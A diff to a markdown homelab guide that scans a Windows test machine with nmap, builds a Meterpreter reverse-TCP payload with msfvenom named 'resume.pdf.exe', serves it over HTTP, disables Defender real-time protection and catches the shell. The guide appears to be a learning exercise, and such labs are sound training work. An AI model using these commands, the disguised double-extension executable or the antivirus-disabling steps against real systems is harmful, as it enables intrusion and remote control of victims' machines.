@@ -84,8 +84,7 @@
 
 
 
-#### - **On kali machine right click ethernet icon -> edit connections -> wired connections -> settings -> ipv4 -> manual -> add -> 192.168.20.11 -> mask - 24 -> save double check with if config 
-**
+- ####  **On kali machine right click ethernet icon -> edit connections -> wired connections -> settings -> ipv4 -> manual -> add -> 192.168.20.11 -> mask - 24 -> save double check with if config**
 ![Screenshot 2024-12-19 070628](https://github.com/user-attachments/assets/04daa2b9-c0df-40b9-912c-4b3039d63436)
 
 
@@ -114,17 +113,29 @@
 - #### B. Start scanning all portts using nmap :-
 
 - On your kali open terminal -> type command nmap -A 192.168.20.10 -Pn where -Pn skips ping the ip adress is of our victim machine - windows machine and -A enables os detection version detection script scanning and traceroute : will identify any ports that are open
+
+
+![Screenshot 2024-12-21 141409](https://github.com/user-attachments/assets/9c023e41-ef4e-4a03-91bd-dfef2e619de1)
+
+
+
 ---
 - #### C. Create our own malware :-
 
  - To get a list of payloads - msfvenom -l payloads
 
- - Enter msfvenom -p (paste your payload) windows/x64/meterpreter/reverse_tcp lhost=ip of attack machine 192.168.20.11 lport=4444 -f exe -o resume.pdf.exe
+ - Enter msfvenom -p (paste your payload) windows/x64/meterpreter/reverse_tcp lhost=ip of attack machine 192.168.100.181 lport=4444 -f exe -o resume.pdf.exe
 
    [what this command does :- will generate our malware using meterpreter reverse tcp payload instructed to connect back to the machine based on lhost and lport file format will be an exe and name 
    being resume.exe ]
  
  - Verify with ls
+
+
+![Screenshot 2024-12-21 140549](https://github.com/user-attachments/assets/9ecac0fd-5abd-42fe-bffc-ef5e0867cfad)
+
+
+
 ---
  - ####  D. Open a handler that will listen in on the port we have configured in our malware :-
 
@@ -133,6 +144,11 @@
  - Type options change the payload to reverse_tcp set payload (paste your payload) and set lhost as your attacker machine press enter check with options
 
  - Start the handler by typing in exploit : we are now listening in and waiting for our test machine to exe our malware
+
+![Screenshot 2024-12-21 140042](https://github.com/user-attachments/assets/97881fb3-bf6f-4ee9-a968-e4ad7214e115)
+
+
+
 ---
  - #### E. Setup a http server on our kali machine so our test machine can download the malware
 
@@ -144,11 +160,16 @@
 
  - Go to security center -> virus and threat protection -> manage settings -> disable real time protection
 
- - Open browser and type in ip of kali : 192.168.20.11:9999 -> click resume.pdf.exe -> download and open it
+ - Open browser and type in ip of kali : 192.168.100.181:9999 -> click resume.pdf.exe -> download and open it
 
  - Open cmd with admin priviledges -> netstat -anob [ to see an estb connection with our kali machine ]
 
  - Now head over to kali where looking at our handler we should have an open shell we now have a connection [ meterpreter tab ]
+
+
+![Screenshot 2024-12-21 141125](https://github.com/user-attachments/assets/c93f0b19-ce42-4cc3-8f42-2d399e654475)
+
+
 
 ---
  
